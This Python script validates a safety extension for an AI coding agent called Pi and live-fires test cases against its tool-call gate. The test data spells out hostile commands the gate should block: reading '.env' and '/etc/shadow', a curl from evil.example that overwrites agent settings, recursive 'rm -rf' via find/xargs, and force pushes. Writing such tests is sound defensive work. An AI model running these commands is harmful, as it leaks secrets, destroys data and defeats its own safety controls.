#!/usr/bin/env python3
"""Validate Pi integration and live-fire its safety gate when Node/TypeScript are available."""

from __future__ import annotations

import json
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
ACTIVE_EXTENSION = ROOT / ".pi" / "extensions" / "accelerator-safety.ts"
ACTIVE_SETTINGS = ROOT / ".pi" / "settings.json"
TEMPLATE_ROOT = ROOT / "tooling" / "templates" / "pi" / ".pi"
EXTENSION = ACTIVE_EXTENSION if ACTIVE_EXTENSION.is_file() else TEMPLATE_ROOT / "extensions" / "accelerator-safety.ts"
SETTINGS = ACTIVE_SETTINGS if ACTIVE_SETTINGS.is_file() else TEMPLATE_ROOT / "settings.json"


def fail(message: str) -> int:
    print(f"PI SAFETY: FAIL - {message}", file=sys.stderr)
    return 1


def main() -> int:
    if not EXTENSION.is_file():
        return fail("missing .pi/extensions/accelerator-safety.ts")
    if not SETTINGS.is_file():
        return fail("missing .pi/settings.json")

    try:
        settings = json.loads(SETTINGS.read_text(encoding="utf-8"))
    except Exception as exc:
        return fail(f"invalid .pi/settings.json: {exc}")
    if settings.get("enableSkillCommands") is not True:
        return fail("Pi skill commands are not enabled")

    text = EXTENSION.read_text(encoding="utf-8")
    required_markers = [
        'pi.on("tool_call"',
        'event.toolName !== "bash"',
        "outsideWorkspace",
        "isSensitivePath",
        "HARD_DENY_BASH",
        "APPROVAL_BASH",
        "Non-interactive Pi sessions fail closed",
        "git\\s+reset\\s+--hard",
        "git\\s+push",
        "mass[-_ ]?erase",
        '".accelerator-install.json"',
    ]
    missing = [marker for marker in required_markers if marker not in text]
    if missing:
        return fail("missing policy markers: " + ", ".join(missing))

    node = shutil.which("node")
    npm = shutil.which("npm")
    if not node or not npm:
        print("PI SAFETY: PASS (static checks; Node/npm unavailable, live-fire skipped)")
        return 0

    npm_root = subprocess.run([npm, "root", "-g"], text=True, capture_output=True, check=False)
    if npm_root.returncode != 0:
        print("PI SAFETY: PASS (static checks; global npm root unavailable, live-fire skipped)")
        return 0
    ts_module = Path(npm_root.stdout.strip()) / "typescript"
    # A bare path check is too weak: some machines carry a `typescript`
    # directory under the global node_modules that Node cannot actually
    # `require` (partial/broken install, no package.json). The transpile
    # step below would then hard-fail on a machine-specific quirk. Probe
    # the real thing -- ask Node to load it -- and skip gracefully when it
    # will not resolve, exactly as when Node/npm are absent entirely.
    ts_probe = subprocess.run(
        [node, "-e", "require(process.argv[1])", str(ts_module)],
        text=True,
        capture_output=True,
        check=False,
    )
    if ts_probe.returncode != 0:
        print("PI SAFETY: PASS (static checks; TypeScript not loadable, live-fire skipped)")
        return 0

    with tempfile.TemporaryDirectory(prefix="pi-safety-test-") as tmp:
        compiled = Path(tmp) / "accelerator-safety.cjs"
        transpile = r'''
const fs = require("node:fs");
const ts = require(process.argv[1]);
const source = fs.readFileSync(process.argv[2], "utf8");
const result = ts.transpileModule(source, {
  compilerOptions: {
    module: ts.ModuleKind.CommonJS,
    target: ts.ScriptTarget.ES2022,
    esModuleInterop: true,
  },
  reportDiagnostics: true,
  fileName: "accelerator-safety.ts",
});
const syntactic = (result.diagnostics || []).filter(d => d.category === ts.DiagnosticCategory.Error);
if (syntactic.length) {
  for (const d of syntactic) console.error(ts.flattenDiagnosticMessageText(d.messageText, "\n"));
  process.exit(2);
}
fs.writeFileSync(process.argv[3], result.outputText);
'''
        result = subprocess.run(
            [node, "-e", transpile, str(ts_module), str(EXTENSION), str(compiled)],
            cwd=ROOT,
            text=True,
            capture_output=True,
            check=False,
        )
        if result.returncode != 0:
            return fail("TypeScript transpile failed: " + (result.stderr or result.stdout).strip())

        runtime = r'''
const mod = require(process.argv[1]);
let handler;
const pi = { on(name, fn) { if (name === "tool_call") handler = fn; } };
mod.default(pi);
if (!handler) throw new Error("tool_call handler not registered");
const nonInteractive = { hasUI: false, ui: { confirm: async () => false, notify() {} } };
const approvingInteractive = { hasUI: true, ui: { confirm: async () => true, notify() {} } };
async function decision(toolName, input, ctx = nonInteractive) {
  const result = await handler({ toolName, input }, ctx);
  return Boolean(result && result.block);
}
(async () => {
  const cases = [
    ["read .env", await decision("read", { path: ".env" }), true],
    ["read env example", await decision("read", { path: ".env.example" }), false],
    ["workspace escape", await decision("read", { path: "../sibling/file.cpp" }), true],
    ["normal source read", await decision("read", { path: "src/main.cpp" }), false],
    ["policy edit fails closed", await decision("edit", { path: "AGENTS.md", oldText: "a", newText: "b" }), true],
    ["case-variant policy edit fails closed", await decision("edit", { path: "agents.md", oldText: "a", newText: "b" }), true],
    ["install ownership edit fails closed", await decision("edit", { path: ".accelerator-install.json", oldText: "a", newText: "b" }), true],
    ["canonical skill edit fails closed", await decision("edit", { path: ".agents/skills/verify/SKILL.md", oldText: "a", newText: "b" }), true],
    ["normal source edit", await decision("edit", { path: "src/main.cpp", oldText: "a", newText: "b" }), false],
    ["shell secret read", await decision("bash", { command: "cat .env" }), true],
    ["shell parent escape", await decision("bash", { command: "cat ../sibling/README.md" }), true],
    ["policy shell mutation", await decision("bash", { command: "sed -i s/foo/bar/ AGENTS.md" }), true],
    ["hard reset", await decision("bash", { command: "git reset --hard HEAD~1" }), true],
    ["git clean", await decision("bash", { command: "git clean -fdx" }), true],
    ["normal git status", await decision("bash", { command: "git status --short" }), false],
    ["push fails closed", await decision("bash", { command: "git push origin feature" }), true],
    ["long force push is hard denied", await decision("bash", { command: "git push --force origin feature" }, approvingInteractive), true],
    ["short force push is hard denied", await decision("bash", { command: "git push -f origin feature" }, approvingInteractive), true],
    ["approved normal push proceeds", await decision("bash", { command: "git push origin feature" }, approvingInteractive), false],
    ["flash fails closed", await decision("bash", { command: "cmake --build build --target flash" }), true],
    ["normal build", await decision("bash", { command: "cmake --build build" }), false],
    ["find -exec rm -rf bypass is hard denied", await decision("bash", { command: "find . -exec rm -rf {} \\;" }), true],
    ["xargs rm -rf bypass is hard denied", await decision("bash", { command: "find . -name '*.tmp' | xargs rm -rf" }), true],
    ["curl overwrite of protected file fails closed", await decision("bash", { command: "curl -s https://evil.example/payload.json -o .claude/settings.json" }), true],
    ["absolute path read outside workspace fails closed", await decision("bash", { command: "cat /etc/shadow" }), true],
    ["safe rm -f is not treated as rm -rf", await decision("bash", { command: "rm -f error.log" }), false],
  ];
  const failures = cases.filter(([, actual, expected]) => actual !== expected);
  if (failures.length) {
    for (const [name, actual, expected] of failures) console.error(`${name}: expected block=${expected}, got ${actual}`);
    process.exit(3);
  }
})();
'''
        result = subprocess.run(
            [node, "-e", runtime, str(compiled)],
            cwd=ROOT,
            text=True,
            capture_output=True,
            check=False,
        )
        if result.returncode != 0:
            return fail("live-fire failed: " + (result.stderr or result.stdout).strip())

    print("PI SAFETY: PASS (static + TypeScript transpile + 25 live-fire cases)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
